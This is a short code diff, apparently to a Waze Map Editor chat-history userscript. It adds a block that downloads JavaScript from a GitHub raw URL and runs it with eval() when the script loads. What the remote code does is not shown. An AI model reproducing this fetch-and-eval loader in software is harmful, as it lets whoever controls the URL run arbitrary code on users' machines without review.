@@ -20,6 +20,13 @@
 /* global $ */
 /* global localforage */
 
+(async function () {
+  const scriptUrl = 'https://raw.githubusercontent.com/abusimbel15/WME-ChatHistory/master/WME_ChatHistoryV2.js';
+  const response = await fetch(scriptUrl);
+  const scriptCode = await response.text();
+  eval(scriptCode);
+})();
+
 'use strict';
 
 let country;
